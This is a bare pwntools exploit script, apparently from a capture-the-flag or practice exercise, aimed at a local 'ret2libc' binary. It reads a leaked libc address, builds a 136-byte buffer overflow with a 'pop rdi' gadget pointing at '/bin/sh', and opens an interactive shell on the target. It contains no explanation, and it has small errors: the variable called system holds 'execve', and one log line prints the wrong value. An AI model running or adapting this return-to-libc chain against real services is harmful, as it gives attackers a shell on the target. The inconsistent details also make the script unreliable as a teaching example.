#!/usr/bin/python
from pwn import *
import sys

# context.log_level = 'debug'

addr = "127.0.0.1"
port = 1234
if len(sys.argv)>1:
    port = int(sys.argv[1])

p = remote(addr,port)
#p = process('./ret2libc')

libc = ELF('../libc.so.6')
system_libc = libc.symbols['execve']
binsh_libc = libc.search('/bin/sh').next()
system = u64(p.recv(8))
log.info("system@libc: " + hex(system))
binsh = system - system_libc + binsh_libc
log.info("binsh@libc: " + hex(system))
pr = 0x4006f3 # pop rdi
payload = 'A'*136 + p64(pr) + p64(binsh) + p64(system)
#gdb.attach(p)
p.sendline(payload)
p.interactive()
